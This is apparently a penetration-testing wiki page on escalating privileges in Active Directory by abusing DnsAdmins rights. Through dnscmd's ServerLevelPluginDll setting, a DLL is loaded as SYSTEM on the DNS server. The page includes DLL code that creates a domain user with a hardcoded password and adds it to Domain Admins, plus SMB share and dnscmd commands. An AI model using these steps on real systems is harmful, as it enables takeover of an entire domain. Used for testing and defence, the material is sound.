# Privilege Escalation using DNS Admin AD group privileges

## Privilege Escalation using DNS Admin AD group privileges [t-ad-privileged_groups-groups-dnsadmins]

A user who is member of the DNSAdmins group or have write privileges to a DNS server object can 
load an arbitrary DLL with SYSTEM privileges on the DNS server. This is really interesting as the 
Domain Controllers are used very frequently as DNS servers.

According to Microsoft protocol specification, the "ServerLevelPluginDll" operation enables us 
to load a dll of our choosing (with no verification of dll path).

dnscmd.exe already implements this option: dnscmd.exe /config /serverlevelplugindll \\path\to\dll

When executing this dnscmd.exe command as a user that is a member of DNSAdmins, the following 
registry key is populated: 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll

Restarting the DNS service will load the DLL in this path; however, the DLL needs to contain 
"one of the DnsPluginInitialize, DnsPluginCleanup or DnsPluginQuery exports."



{% hint style="info" %}This technique is not production safe !!! If there is something wrong with the path or with the dll - DNS service will stop be started. Think twice, align the exploitation with the customer.
DNSAdmins group membership isn`t required. It`s possible to successfully perform these steps if the account has write access to a DNS server object.
In a default configuration, members of the DnsAdmins group do not have special access to start/stop the dns service.
Microsoft`s MSRC have been contacted regarding this issue and have stated that it will be fixed by basically only allowing DC administrators to change the ServerLevelPluginDll registry key, and that it will be possible to toggle this feature off in future releases.
{% endhint %}
### 1.1 Create a valid DLL for the DNS Service



{% code overflow="wrap" %}
```bash
- download the source code https://github.com/kazkansouh/DNSAdmin-DLL
- change the DnsPluginInitialize function to something like:

  DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
  {
      system("C:\\Windows\\System32\\net.exe user pentest R2AscpWd2443 /add /domain");
      system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" pentest /add /domain");
  }
- compile

```
{% endcode %}

### 1.2 Put file on the SMB share if there is no local access to the DNS server




**option 1: Windows**

{% code overflow="wrap" %}
```bash
If you have access to the Windows host - just create a new share, put it there, allow access to everyone
```
{% endcode %}

{% hint style="info" %}Or find any publicly accessible share on the network

{% endhint %}


**option 2: Linux**

{% code overflow="wrap" %}
```bash
Add a new block to the /etc/samba/smb.conf file, put the file and restart the service:

[share]
path = /tmp/
browseable = yes
read only = no
guest ok = yes

```
{% endcode %}

{% hint style="info" %}It won't work in most cases due to security configuration in modern systems (unauthenticated guest access is forbidden). 
You need to use a proper windows domain share


{% endhint %}

### 1.3 Configure the plugin to run when the DNS server is started



{% code overflow="wrap" %}
```bash
dnscmd.exe /config /serverlevelplugindll \\<PCNAME>\share\DNSAdmin-DLL.dll
```
{% endcode %}

{% hint style="info" %}the path can be local or remote

{% endhint %}

### 1.4 Wait for the dns service to restart



### 1.5 Revert the configuration after a successful exploitation



{% code overflow="wrap" %}
```bash
dnscmd.exe /config /serverlevelplugindll ""
```
{% endcode %}

